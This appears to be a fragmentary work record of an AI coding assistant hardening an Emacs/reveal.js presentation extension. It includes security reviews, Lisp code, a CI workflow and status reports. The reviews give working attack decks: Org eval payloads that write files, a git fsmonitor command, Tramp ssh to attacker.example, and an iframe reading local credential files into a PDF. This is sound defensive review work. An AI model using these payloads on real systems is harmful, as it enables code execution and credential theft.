121	
122	## Engines
123	
124	**org-re-reveal** exports Org exactly as `C-c C-e v v` does in Emacs, with
125	org-re-reveal 3.39.0. `#+REVEAL_THEME`, `#+REVEAL_PLUGINS`, `#+ATTR_REVEAL`
126	fragments, `#+BEGIN_NOTES` and `:reveal_background:` all apply. Emacs runs with
127	`-Q`, so nothing in your configuration changes the result. Three settings differ
128	from an interactive export:
129	
130	- Code blocks never run (`org-export-use-babel` is off) and file-local variables
131	  are ignored. Building a deck you did not write is safe.
132	- A deck without `#+AUTHOR` has no author. Batch Emacs would otherwise fill it
133	  from your login and hostname.
134	- There is no export timestamp, and Org's heading IDs come from a fixed seed, so
135	  rebuilds are byte-identical.
136	
137	Org sources always use this engine. pandoc's Org reader drops `#+REVEAL_`
138	options and fragments, and turns speaker notes into visible slide text.
139	
140	**pandoc** renders Markdown with `--slide-level=2`: level-1 and level-2 headings
141	start slides, and level-2 headings under a level-1 heading form a vertical
142	stack. Speaker notes go in `::: notes` blocks. The extension takes pandoc's own
143	reveal.js template from `pandoc -D revealjs` and moves its plugin paths to
144	reveal.js 6's layout. A `theme:` in the front matter wins over the `theme`
145	global argument.
146	
147	**reveal-markdown** wraps the Markdown in a page that reveal.js's markdown
148	plugin renders in the browser. A line of `---` between blank lines starts a
149	slide, `--` a vertical one, and text after `Note:` is speaker notes.
150	
151	## reveal.js and pinned downloads
152	
153	Every deck is built against reveal.js 6.0.1. Without `selfContained`, the page
154	loads it from `cdn.jsdelivr.net/npm/reveal.js@6.0.1` and each script and
155	stylesheet carries an `integrity` hash, so a browser refuses a changed file.
156	With `selfContained`, every reveal.js file is inlined (about 1.8 MB) and the
157	deck opens offline. Either way, local images, videos and stylesheets are inlined
158	as data URIs.
159	
160	Each file the extension downloads is checked against a SHA-256 in
161	`extensions/models/presentation/_lib/pins.ts`:
162	
163	- reveal.js runtime files, from jsDelivr
164	- org-re-reveal 3.39.0 and htmlize 1.59, by commit URL
165	
166	A download that does not match is refused, and a cached copy that no longer
167	matches is downloaded again. The build record's `external` field lists anything

Round 1 turned up real problems, all now fixed. The serious ones were in the extension:

- **A deck could copy local files into the stored HTML.** `#+INCLUDE`, extra-CSS links and `..` image paths could pull in things like `/etc/hostname`. Files are now read and inlined only from the source's own directory, outside `.git` and `.swamp`, with symlinks resolved.
- **Some deck names overwrote other decks' data.** A deck called `x-html` collided with deck `x`'s HTML. Each kind of data now has its own prefix (`deck-`, `html-`, `pdf-`, `outline-`, `print-`), and `swamp-present.el` uses the new names.
- **A deck could hang PDF export forever.** A page that blocks its own main thread now stops at `timeoutSeconds`, and Emacs and pandoc runs have a timeout as well.

The `emacs-swamp` review found only medium and low issues. I fixed them too: PDF export takes `C-u` for a self-contained deck, an open PDF is refreshed instead of prompting, swamp's errors show up even when it prints them to stderr, names are checked before they reach swamp, and commands can time out or be cancelled.

The new security tests run the reviewer's attack decks through real Emacs and pandoc. All four commands also work from Emacs against real swamp.

Building a deck someone else wrote is now reasonably safe, with one boundary: what the deck's own scripts do once it's open in a browser is up to the browser.

Four behavior changes worth knowing:
- **Files outside the deck's directory:** a `#+SETUPFILE` from a shared theme repo, or images in a sibling `../assets` folder, now stop the build or produce a warning. You'd need to keep those files inside the deck's directory.
- **Inline content:** a deck passed as text can't use `#+INCLUDE` or `#+SETUPFILE`, because it has no directory of its own.

7. **Timeout, cancel, async fetch:** fixed. **File/Line(s):** `swamp-present.el` 167–206 (`--start`), 235–249 (`--fetch`), 304–323 (`--print`), 342–362 (preview, pdf callbacks)

**Issue:** `make-process` runs in the current buffer's `default-directory`, and `swamp--command-args` reads `swamp-repo-dir` at call time. The fetch and `export_pdf` steps start inside a process sentinel. A sentinel runs with whatever buffer happens to be current then, not the source buffer. So with the default `swamp-repo-dir nil` (where swamp uses the current directory), or a buffer-local or dir-locals `swamp-repo-dir`, every step after the build picks up a different buffer's directory and value. A relative `swamp-present-output-directory` resolves against that buffer too.

**Breaking input (reproduced):** I built from `A/talk.org`, then made a dired buffer of `B/` current while waiting. A fake swamp logged the working directory of each call:

/tmp/claude-1000/review-el2/A :: model method run talks build --input source=.../A/talk.org --json
/tmp/claude-1000/review-el2/B :: data query model("talks") && name == "html-talk" --select content
```

**Impact:** Users naturally switch buffers during a PDF export, which can take up to about 120 s. If they do, preview or PDF either fails ("Behavior not found: talks"), or silently fetches or prints another repository's `talks/talk` deck, which shows the wrong content with no error.

In the sentinel, wrap the call as `(let ((default-directory dir) (swamp-repo-dir repo)) (funcall on-exit ...))` so every chained `--start` inherits them. **File/Line(s):** `swamp-present.el` 258

**Issue:** The file name is `swamp-present-<instance>-<name>.<ext>`, and both instance names and deck names may contain `-`. This brings back the kind of collision the extension removed by switching to prefixed data names.

**Breaking input:** Instance `a-b` with deck `c`, and instance `a` with deck `b-c`, both write `swamp-present-a-b-c.html` (or `.pdf`).

**Impact:** One deck's preview overwrites the other's. A reloaded browser tab, or a reverted PDF buffer, then shows the wrong deck.

**Fix:** Use a separator that neither pattern allows, such as a subdirectory per instance (`<dir>/<instance>/<name>.html`). Alternatively, use `_`, which the instance pattern allows but the deck-name pattern does not; that is unambiguous only if `_` never appears in the deck-name part.

### [LOW] Rewriting a preview silently discards edits in a buffer visiting it
**File/Line(s):** `swamp-present.el` 269–271

**Issue:** `(revert-buffer t t t)` runs even when the buffer is modified.

**Breaking input (reproduced):** I opened the preview HTML, inserted " MY EDITS", and rebuilt. The buffer became "new" with modified=nil, and the edits were gone without a prompt.

**Fix:** Revert without asking only when `(not (buffer-modified-p buf))`. Otherwise leave the buffer alone and say so in a message, or ask.

### [LOW] A missing `swamp-executable` leaks two hidden buffers per attempt
**File/Line(s):** `swamp-present.el` 172–184

**Issue:** `make-process` signals `file-missing` synchronously, after the `out` and `err` buffers already exist.

**Breaking input (reproduced):** With `swamp-executable "/nonexistent/swamp"`, the `*swamp-present-out*` and `*swamp-present-err*` buffers remain after the error.

**Fix:** Wrap the `make-process` call in `condition-case` (or an `unwind-protect` keyed on a success flag) that kills both buffers and re-signals.

(defun swamp-present--start (args binary on-exit)
  "Run swamp with ARGS asynchronously and call ON-EXIT when it ends.
ON-EXIT gets the exit status, or `timed-out' or `cancelled' for a command
that was stopped, then stdout and stderr.  With BINARY, stdout is read as
raw bytes.  The command is stopped after `swamp-present-timeout' seconds."
  (let* ((out (let ((buf (generate-new-buffer " *swamp-present-out*")))
                ;; Before the process starts, so no output is decoded early.
                (with-current-buffer buf (set-buffer-multibyte (not binary)))
                buf))
         (err (generate-new-buffer " *swamp-present-err*"))
         (proc (make-process
                :name "swamp-present"
                :buffer out
                :stderr err
                :coding (if binary 'binary 'utf-8)
                :command (cons swamp-executable (swamp--command-args args))
                :noquery t
                :sentinel #'ignore))
         (timer (when swamp-present-timeout
                  (run-at-time swamp-present-timeout nil
                               (lambda ()
                                 (when (process-live-p proc)
                                   (process-put proc 'stopped 'timed-out)
                                   (delete-process proc)))))))
    (set-process-sentinel
     proc
     (lambda (p _event)
       (unless (process-live-p p)
         (when timer (cancel-timer timer))
         (unwind-protect
             (let ((stdout (with-current-buffer out (buffer-string)))
                   (stderr (if (buffer-live-p err)
                               (with-current-buffer err (buffer-string))
                             "")))
               (funcall on-exit
                        (or (process-get p 'stopped) (process-exit-status p))
                        stdout stderr))
           (kill-buffer out)
           (when (buffer-live-p err) (kill-buffer err))))))
    proc))
(defun swamp-present--output-file (deck name extension)
  "Return the preview file for deck NAME of instance DECK with EXTENSION."
  (let ((dir (file-name-as-directory
              (or swamp-present-output-directory
                  (locate-user-emacs-file "swamp-present/")))))
    (unless (file-directory-p dir)
      (with-file-modes #o700 (make-directory dir t)))
    (expand-file-name (format "swamp-present-%s-%s.%s" deck name extension)
                      dir)))

(defun swamp-present--write (file bytes)
  "Write unibyte BYTES to FILE and return the buffer visiting it, if any.
A buffer already visiting FILE is reverted, so it shows the new content
without asking."
  (let ((coding-system-for-write 'binary))
    (with-temp-file file
      (set-buffer-multibyte nil)
      (insert bytes)))
  (let ((buf (find-buffer-visiting file)))
    (when buf
      (with-current-buffer buf (revert-buffer t t t)))
    buf))

<result>## Verdict: FAIL

I found one CRITICAL and four HIGH security defects, all confirmed against real Emacs 31.1, pandoc 3.7 and Chromium. A deck file on its own can still run Lisp, write files anywhere and make ssh connections, and `export_pdf` prints files from outside the deck's directory into the stored PDF. Two of the round-1 fixes are incomplete: the macro advice misses the built-in macros, and the pandoc outline still numbers rules wrongly in the most common deck shape.

All four gates pass, and so does the integration run (`PRESENTATION_INTEGRATION=1`, 71 tests). `swamp extension quality` reports `passed`, 100%, with two `deno-command` warnings left open. I modified no repository files; scratch work is in `/tmp/claude-1000/review-ext2/`.

### [CRITICAL] Org's built-in title/date/author/email macros still evaluate Lisp
**File:** `presentation/extensions/models/presentation/_lib/engines.ts` **Line(s):** 80–88
**Issue:** The advice skips the last four template entries on the assumption that they are Org's built-ins. In Org 9.8, those entries carry the raw text of `#+TITLE`, `#+DATE`, `#+AUTHOR` and `#+EMAIL`. Org compiles any template that starts with `(eval` and runs it when the macro is expanded. Defining a macro called `title` is refused, but setting `#+TITLE` to an eval form is not. `#+SETUPFILE` is not a route, because Org reads these four keywords from the buffer only; an `#+INCLUDE`d file is.
**Breaking input (verified, the marker file was created):**
```org
#+TITLE: (eval (progn (with-temp-file "/tmp/PWNED" (insert "x")) "Owned"))
* A
{{{title}}}
```
The same works with `#+DATE:` and `{{{date}}}`, `#+AUTHOR:` and `{{{author}}}`, and `#+EMAIL:` and `{{{email}}}`.
**Impact:** Any deck runs arbitrary Lisp, which means arbitrary code as the user.
**Fix:** Check all four built-ins too. Allow the `date` entry only when it is Org's own generated `(eval (if (org-string-nw-p $1) (org-format-timestamp '...` form, which is what a real timestamp `#+DATE` produces; refuse it otherwise. A simpler alternative is to advise `org-macro--set-templates` and refuse any eval template whose source is not Org's timestamp form. Add tests for all four keywords.

### [HIGH] TTS options let a deck create and delete files in any directory
**File:** `engines.ts` BUILD_EL (no guard on writes); org-re-reveal 3.39.0 at lines 3575–3605 and 1830–1845
**Issue:** `reveal_with_tts`, `#+REVEAL_TTS_DIR` and `#+REVEAL_TTS_NAME_PREFIX` come from the deck. The export then:
- runs `make-directory` on the deck's directory;
- deletes `<dir><prefix>.tts` if it exists;
- appends to that file;
- writes each slide's speaker notes to `<dir><md5>`.
**Breaking input (verified, both files appeared outside the deck):**
```org
#+OPTIONS: reveal_with_tts:t
#+REVEAL_TTS_DIR: /tmp/claude-1000/review-ext2/ttsout/
#+REVEAL_TTS_NAME_PREFIX: evil
* A
#+BEGIN_NOTES
echo PWNED-via-tts
#+END_NOTES
```
This produced `ttsout/evil.tts` and `ttsout/6f028d…` containing `echo PWNED via tts`.
**Impact:** The deck chooses the directory and much of the content of files written anywhere the user can write. Any `*.tts` file can be deleted. On systems where `~/.bashrc` sources every file in `~/.bashrc.d/`, this becomes code execution.
**Fix:** Set `org-re-reveal-with-tts nil`, remove `org-re-reveal-prepare-tts` from `org-export-before-parsing-functions`, and refuse the option. Defence in depth: advise `write-region`, `append-to-file`, `make-directory` and `delete-file` to allow only the output path.

### [HIGH] Building a deck inside a crafted git checkout runs shell commands
**File:** `engines.ts` **Line(s):** 114 (`find-file-noselect`)
**Issue:** `find-file-noselect` runs `vc-refresh-state`, which runs `git` in the deck's directory, and `{{{modification-time(%Y,t)}}}` runs `git log` as well. A `.git/config` in that directory, or in any parent, is honoured. The extension already treats `.git` as sensitive for reads but lets Emacs execute git against it.
**Breaking input (verified):** a deck directory that is a git repo with `git config core.fsmonitor "touch $D/PWNED-fsmonitor; false"`, containing a plain `* A` deck. Building it created `PWNED-fsmonitor`.
**Impact:** Arbitrary command execution when the deck's directory comes from an untrusted archive.
**Fix:** In BUILD_EL, `(setq vc-handled-backends nil)` and clear `find-file-hook`, or load the source with `insert-file-contents` into a buffer in `org-mode` instead of `find-file-noselect`.

### [HIGH] Remote paths make Emacs ssh to a host the deck names
**File:** `engines.ts` **Line(s):** 103–113
**Issue:** The read guard calls `file-truename`, and Org calls `file-readable-p`, before any refusal. On a `/ssh:host:` path, both open a Tramp connection.
**Breaking input (verified with an ssh shim on PATH):** `#+INCLUDE: "/ssh:attacker.example:/etc/hostname" src text` ran `ssh -e none attacker.example`, then the build failed.
**Impact:** Outbound SSH to an attacker's host using the user's `~/.ssh/config`, keys and agent. With `ForwardAgent` on, the attacker gets agent access. The README's claim of reading nothing outside the deck's directory does not hold.
**Fix:** Set `tramp-mode nil` and remove the Tramp entries from `file-name-handler-alist` at the top of BUILD_EL. Refuse any path where `(file-remote-p f)` is true before calling `file-truename`.

### [HIGH] `export_pdf` prints local files from outside the deck into the PDF
**File:** `presentation/extensions/models/presentation/deck.ts` **Line(s):** 735–745; `_lib/pdf.ts` 58–59
**Issue:** Chromium opens the deck as a `file://` page. Raw HTML in the deck (`<iframe>`, `<img>`, `<object>` pointing at local paths) loads and renders any file the user can read. The confined inliner only governs build-time inlining.
**Breaking input (verified, the marker appears on page 2 of the stored PDF):**
```markdown
<iframe src="file:///tmp/claude-1000/review-ext2/t8/secret.txt" width="800" height="200"></iframe>
```
Swapping in `file:///home/<user>/.aws/credentials` would print that instead.
**Impact:** Files such as credentials and keys get copied into a swamp data artifact that may be shared.
**Fix:** Do not print from a `file:` origin. Either serve the HTML from a one-file local HTTP server, or use `Fetch.enable` and fail every request whose URL is not the deck itself or an `https:` URL. Add an integration test.

### [MEDIUM] `external` and "self-contained" under-report what the deck loads
**File:** `presentation/extensions/models/presentation/_lib/html.ts` **Line(s):** 50–57, 341, 501–543
**Issue:**
- The tag pattern `<tag[^>]*>` stops at the first `>`, even one inside a quoted attribute value.
- `RESOURCE_ATTRS` omits `srcset`, `object data`, SVG `href`/`xlink:href`, the legacy `background` attribute, and `link rel=modulepreload/prefetch/manifest`.
- An HTML comment containing `<script>` or `<textarea>` makes `segments()` treat the rest of the page as opaque.
**Breaking input (verified, pandoc engine, `selfContained: true`):** `<img alt="x>y" src="https://t1.example/gt.png">`, `<img srcset="https://t2…">`, `<object data="https://t3…">`, `<svg><image href="https://t4…"/></svg>`, `<table background="https://t5…">`, `<link rel="modulepreload" href="https://t6…">` and `<img alt="q>" src="a.png">`. Only `t7` (`<input src>`) was reported. `a.png` was neither inlined nor warned about.
**Impact:** A deck that reports offline and self-contained still fetches remote resources (tracking pixels) and references local files.
**Fix:** Use a quote-aware tag scanner, for example `<tag(?:"[^"]*"|'[^']*'|[^'">])*>`, shared by every function. Extend the attribute set. Skip comments in `segments`.

### [MEDIUM] Src-block language names call a `<lang>-mode` function the deck chooses
**File:** BUILD_EL (no restriction); ox-html `org-html-fontify-code` (`funcall lang-mode`)
**Issue:** Without the highlight plugin, htmlize fontifies every src block by calling `<lang>-mode`.
**Breaking input (verified, run with HOME set to a scratch directory):** a block opened with `#+BEGIN_SRC savehist` enabled `savehist-mode`, which wrote `$HOME/.emacs.d/history` on exit.
**Impact:** The deck can call any `*-mode` command, contrary to "runs nothing it names", including ones that write files outside its directory.
**Fix:** Advise `org-src-get-lang-mode` to return nil (or `fundamental-mode`) for anything outside a fixed allowlist, or set `org-re-reveal-no-htmlize-src t`.

### [MEDIUM] Repointing a symlinked source breaks its own deck
**File:** `deck.ts` **Line(s):** 360–363, 378–392
**Issue:** The deck is named after the link but owned by the link's target. Repointing the link, which is the point of the README's `current.org → v3.org` example, makes every later build fail.
**Breaking input (verified):** build `current.md → v3.md`, repoint it to `v4.md`, then build again. Result: `Deck name "current" already belongs to v3.md`.
**Fix:** Record ownership by the path as given, made relative to the repository and not resolved through symlinks.

### [MEDIUM] The pandoc outline numbers horizontal rules wrongly under a level-1 heading
**File:** `presentation/extensions/models/presentation/_lib/source.ts` **Line(s):** 281–355
**Issue:** pandoc puts a rule (or `***`, `___`, `- - -`) after a level-1 heading into that heading's vertical stack. The outline makes it a new top-level slide. It also has three smaller mismatches:
- It drops the untitled slide pandoc creates for content before the first heading, including lists and blockquotes containing rules.
- It keeps `{.unnumbered}` and `{#id}` in titles.
- It splits `# A` followed by `---` into two slides.

**Breaking input (verified against real pandoc):**

| Source | Build | Outline |
|---|---|---|
| `# A\n\ntext\n\n---\n\nafter` | `1, 1.2` | `1, 2` |
| `# A\n\n* * *\n\nx\n\n## B\n\n---\n\n## C` | `1, 1.2, 1.3, 1.4` | `1, 2, 2.2, 2.3, 2.4` |
| `intro text\n\n# A` | 2 slides | 1 slide |

The integration test only exercises a shape where the two happen to agree.
**Impact:** `slidesWithoutNotes` and the outline's indexes point at the wrong slides.
**Fix:** Give a rule the level `min(current.level, 2)` whenever a level-1 heading is open. Emit an untitled slide for content before the first heading. Strip trailing `{...}` attributes from titles.

### [MEDIUM] Chromium that ignores SIGTERM keeps `export_pdf` running past its timeout
**File:** `presentation/extensions/models/presentation/_lib/pdf.ts` **Line(s):** 228–237
**Issue:** The `finally` block sends SIGTERM, then waits for the process without a limit.
**Breaking input (verified):** a fake chromium (`trap '' TERM; sleep 40`) with a 5 s timeout returned after 40 s.
**Fix:** After a grace period, send SIGKILL, and bound the wait for exit.

### [MEDIUM] A stored HTML that has gone missing can never be rebuilt
**File:** `deck.ts` **Line(s):** 571–585, 715–718
**Issue:** `unchanged` compares only the hash in the record and never checks that the HTML version still exists. Once that file is lost (datastore loss or partial sync), `export_pdf` says "Run build again", and the rebuild reports `unchanged` and writes nothing, indefinitely. The PDF branch has the same problem.
**Fix:** Before keeping a prior version, confirm it exists with `getContent`, or add a `force` argument.

### [LOW] Smaller defects
- **Absolute paths in shared records.** Inliner warnings embed the deck directory (verified: `…: outside /tmp/claude-1000/review-ext2/t11, or inside .git…`), and `source.path` is absolute for sources outside the repository. Both end up in `deck-*` records. Make paths relative to the repository or the deck.
- **Outline existence check is unconfined.** `missingImages` (deck.ts 626–643) checks absolute and `../` paths anywhere on the filesystem, so `outline-*` records whether a file exists. It also misses reference definitions, `data-background` and `url()` refs that the build does inline.
- **Out-of-date claims.** The manifest says "Local images are always inlined, so a stored deck never depends on files beside its source", and the deck.ts module doc says the same. The README says a build "reads nothing outside its own directory". Since `../assets` is now refused, and given the PDF, Tramp and git findings, none of these hold.

  "Find value for keyword NAME in current buffer.
Return value associated to the keywords named after NAME, as
a string, or nil.  When optional argument COLLECT is non-nil,
concatenate values, separated with a space, from various keywords
in the buffer."
  (org-with-point-at 1

	  (case-fold-search t)

A slow pandoc build can run up to 3x `buildTimeoutSeconds` before any timeout fires. For org-re-reveal (one subprocess) the timeout is correct; for pandoc it is not. Breaking scenario: `buildTimeoutSeconds=60`, each of the three subprocesses takes 60 s — total 180 s elapsed. Org mode treats `* TODO COMMENT My heading` as a comment subtree and excludes it from export; `outlineOrg` includes it as a slide titled "COMMENT My heading". Fix: move the TODO/DONE/NEXT and priority-cookie strip before the `excluded` check. ### Low 1. `pdf.ts:cdpOverWebSocket` calls `ws.send()` synchronously inside a Promise constructor without a try/catch. A synchronous throw (e.g. `InvalidStateError` on a closed socket) escapes the Promise and becomes an unhandled rejection instead of a clean promise rejection. 2. `cache.ts` download: if the server omits `Content-Length` or sends 0, the declared-size guard passes and `res.arrayBuffer()` buffers the full body before the byte-count check. The README documents the offset, but users comparing both reports will find numbers differ. ### Verdict PASS - no critical or high-severity findings. name: Publish Extensions

on:
  workflow_run:
    # NOTE: Must match the `name:` field in ci.yml exactly
    workflows: ["CI"]
    types: [completed]

# Serialize publishes for a branch, but never cancel one. `swamp extension push`
# writes to the registry and published versions are immutable, so a cancelled
# run can leave some extensions in a matrix published and others not — with no
# way to redo the same version. Queue instead.
concurrency:
  group: publish-${{ github.event.workflow_run.head_branch }}
  cancel-in-progress: false

jobs:
  detect-changes:
    name: Detect changed extensions
    runs-on: ubuntu-latest
    # Only run when CI succeeded
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    outputs:
      extensions: ${{ steps.changes.outputs.extensions }}
      channel: ${{ steps.changes.outputs.channel }}
    steps:
      - name: Verify source repository
        env:
          HEAD_REPO: ${{ github.event.workflow_run.head_repository.full_name }}
          BASE_REPO: ${{ github.repository }}
        run: |
          if [ "$HEAD_REPO" != "$BASE_REPO" ]; then
            echo "::error::Refusing to publish from fork: $HEAD_REPO"
            exit 1
          fi
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          ref: ${{ github.event.workflow_run.head_sha }}
      # Needed to compare manifest versions against the registry (see below).
      - name: Install swamp
        id: setup_swamp
        continue-on-error: true
        uses: swamp-club/setup-swamp@17127b7554de0c07aa413ace39fcf6c104ffc3f7 # v0.1.1
        with:
          api-key: ${{ secrets.SWAMP_API_KEY }}
      - name: Wait before swamp install retry
        if: steps.setup_swamp.outcome == 'failure'
        run: sleep 5
      - name: Install swamp (retry)
        if: steps.setup_swamp.outcome == 'failure'
        uses: swamp-club/setup-swamp@17127b7554de0c07aa413ace39fcf6c104ffc3f7 # v0.1.1
        with:
          api-key: ${{ secrets.SWAMP_API_KEY }}
      - id: changes
        name: Find extensions with changes
        env:
          HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
          HEAD_SHA: ${{ github.event.workflow_run.head_sha }}
          GH_TOKEN: ${{ github.token }}

content.text:
No, publish never ran for this merge, and `@webframp/presentation` isn't on the registry yet.

The cause is how `/lgtm` merges reach CI. The merge workflow (`merge.yml`) merges the PR and then starts CI on main with `gh workflow run ci.yml`, using the built-in `GITHUB_TOKEN`. GitHub doesn't start other workflows from runs triggered by that token. Publish only starts when a CI run finishes, so it never got a run for the merge commit `88df3b17`. Every earlier main CI run that led to a publish was a normal `push` event; this was the only one started by the merge workflow, and the only one with no publish after it.

To publish this release, I re-ran that CI run under your account, which GitHub does let start publish. It's queued, and I'm watching the CI run and then the publish run it triggers. I'll report back once publish finishes.

The re-run fixes this release only; every future `/lgtm` merge will hit the same gap. The fix is to have `merge.yml` merge and start CI with a token that can start other workflows, such as a GitHub App token or a fine-grained personal token. Another option is to give `publish.yml` a manual trigger and have `merge.yml` call it once CI passes. Want me to open a PR for one of these?

It's still not published, and my earlier re-run couldn't have fixed it. A re-run keeps its original trigger, the merge workflow's `GITHUB_TOKEN`, so GitHub blocked publish again. I was wrong to say the re-run would count as yours.

There's also no manual way to start publish from GitHub, and the repo rules forbid publishing from your machine. So I opened [PR #515](https://github.com/webframp/swamp-extensions/pull/515) to fix the publish path:

- **`ci.yml`:** when CI runs on main after an `/lgtm` merge and every check passes, a new final job starts publish for that commit. GitHub does let `GITHUB_TOKEN` start a workflow directly this way.
- **`publish.yml`:** it can now be started that way. It checks that CI passed on the commit, and skips if main has already moved on, since the newer merge's CI will publish both.
- **Pushes:** merges that arrive as an ordinary push still publish as before.

Publish works out what to release by comparing against the last successful publish, `7d93be0a`. So once #515 merges through `/lgtm`, its publish run should also release `@webframp/presentation`. That makes the merge both the test of the fix and the release.

I'm watching #515's CI now. If it passes with no critical or high review findings, I'll comment `/lgtm` and then confirm on the registry that both changes actually published.

**Expression injection** — The two directly-interpolated expressions in `run:` blocks are not attacker-controllable. `${{ github.sha }}` in `dispatch-publish` (ci.yml line ~707) is a 40-char hex hash produced by the runner, not user input. `${{ github.repository }}` is the canonical repo name set by the owner.

The one genuinely user-influenced value, `inputs.sha` in publish.yml, is handled correctly: it is assigned to the `SHA` environment variable and used as `$SHA` in shell, never directly interpolated into a `run:` block. This is the safe pattern.

**Dangerous triggers** — The new `workflow_dispatch` on publish.yml requires write access to trigger manually. The automated path always passes `${{ github.sha }}` (a fixed hex value). The "Check a dispatched commit" step validates that (a) the SHA is main's current HEAD, and (b) CI passed on it before any publish proceeds.

**Unpinned actions** — The only `uses:` in the diff is `actions/checkout@v4`, a first-party action; version tags on `actions/*` are acceptable.

**Permission scoping** — `dispatch-publish` declares `permissions: actions: write` at job level only, the minimum required for `gh workflow run`.

**Self-referential bypass** — `dispatch-publish` fires only on `workflow_dispatch && refs/heads/main` and lists all substantive CI gates in its `needs:`. The `ci-security-review` job is guarded by `if: github.event_name == 'pull_request'`, so it correctly does not run on main; PRs were already reviewed before merging.

### Critical / High
None.

### Medium
None.

### Low

1. **publish.yml — Check a dispatched commit step** — `inputs.sha` is dropped verbatim into a `gh api` URL query string without validation:

   ```bash
   OK=$(gh api "repos/$REPO/actions/workflows/ci.yml/runs?head_sha=$SHA&status=success&per_page=1" ...)
   ```

   If `SHA` contained `&extra=param`, it would inject extra query filters and could cause the API to return a non-zero count for unrelated runs, silently bypassing the CI-passed guard. Real-world exposure is limited to anyone with `actions:write` calling the dispatch endpoint directly with a crafted `sha` input — the only intended caller (`dispatch-publish`) always supplies `${{ github.sha }}`, a 40-char hex string. Fix: add a format guard before the API call: `[[ "$SHA" =~ ^[0-9a-f]{40}$ ]] || { echo '::error::sha must be a 40-char hex string'; exit 1; }`

2. **ci.yml — dispatch-publish / concurrency relationship** — A merge via `merge.yml` produces two concurrent ci.yml runs for the same SHA: one via `push` (GITHUB_TOKEN push still fires the event) and one via `workflow_dispatch` (merge.yml calls `gh workflow run ci.yml`). Both complete because `cancel-in-progress: false` for main. Only the `workflow_dispatch` run triggers `dispatch-publish`; the `push` run is harmless because GitHub suppresses `workflow_run` for GITHUB_TOKEN-originated runs. The correctness depends on `cancel-in-progress` staying `false` for main — if that ever changes, the `workflow_dispatch` run (the one that ultimately publishes) could be cancelled. Low risk; worth a comment on the concurrency block.

### Verdict
PASS — the dispatch chain and STOP mechanism are logically sound. The two CI-run paths per merge are correctly mutually exclusive with respect to publishing, the SHA-mismatch race is handled with graceful early-exit semantics, and the overall security model (only jobs that passed all gates can dispatch publish) is intact.

- The review's medium finding is fixed too: the dispatch step passes the repository and commit through `env:` instead of writing them straight into the shell script.

`@webframp/presentation@2026.10.21.1` is now published to the registry, and its GitHub release went out at 13:01 UTC.

**Why it didn't publish before:** two bugs in the release workflows, fixed in #515 and #516.
- **The merge never triggered a publish.** A `/lgtm` merge ran CI on `main` under GitHub Actions' built-in token. Runs started that way never trigger the publish workflow, and re-running them doesn't help either. CI on `main` now starts the publish itself once all its checks pass (#515).
- **The publish job compared against the wrong commit.** It looked for changes since a commit recorded by an earlier publish run, which treated the presentation extension as already published. It now checks the last 30 commits on `main` and skips any version the registry already has (#516).

**Cleanup:** local `main` is up to date at `a8d01258`, and I deleted the merged branches `fix/publish-after-lgtm-merge` and `fix/publish-diff-window`. The other worktrees belong to unrelated work, so I left them alone.

With PR #1 merged, three things remain. I'd take them in this order.

**1. Add `swamp-present.el` to your Doom recipe.** Doom only installs the files a recipe lists, and yours lists `swamp.el` alone. So `swamp-present` won't load until the recipe changes, in `dotfiles/config/doom/modules/private/swamp/packages.el:5`:

Say the word and I'll make the edit as its own commit, or you can paste it in yourself.

**2. Close Chromium's open debugging port during `export_pdf`.** For the length of a print, any local process can connect to that port and take control of the browser. Chromium can talk to the extension over a pipe instead of a TCP port, which removes the exposure. I'd count this as a security fix, so it ships as a version bump with release notes, through the normal PR process.

**3. Fix the medium and low findings from the #514 review.** These are smaller hardening and consistency fixes. They could go in the same PR as item 2 under one version bump, or in a separate PR.

content.text:
Three commits are now on dotfiles `main` at `origin`, and `fe29158` is the remote head:

- **`2151e63` `feat(doom)`:** loads `swamp-present`, as before.
- **`8ccec1a` `chore(swamp)`:** bumps the swamp binary to `20261022.021804.0`.
- **`fe29158` `feat(claude)`:** covers the Claude Code setup:
  - `settings.json` now has the Stop hook and no longer pins `sonnet`, as you chose.
  - The hook script now lives in the repo at `config/claude/hooks/no-unilateral-deferral.py`. `claude-code.nix` links it into `~/.claude/hooks/`, the same way it already links the status line script.
  - `claude-sync` now copies the hooks to Windows with `cp -rL`. Once home-manager links the script, it's a symlink into the Nix store, and a plain `cp -r` would copy a link that's broken on Windows.
  - `pre-push-review` gains probe 7, the check for deferred work.

The `generic` and `ubuntu` home-manager configs both build in a dry run. `make build` with no host fails here: this machine is `galvatron-wsl`, which has no config in the flake, so pass `HOST=` when you switch. On that first switch, home-manager will replace the copy of the hook script already in `~/.claude/hooks` with the link. The two files are identical, so nothing changes in practice.

`BOOTSTRAP.md` stays untracked, as you asked.

There's also a stray local branch literally named `origin/main`, checked out in some worktree. Because of it, Git warns that `origin/main` is ambiguous. I haven't touched it; I can delete it if it's leftover from something.

Still waiting on you: the `fix(presentation)` PR, which would cover the Chromium debugging port and the medium/low findings from the #514 review.
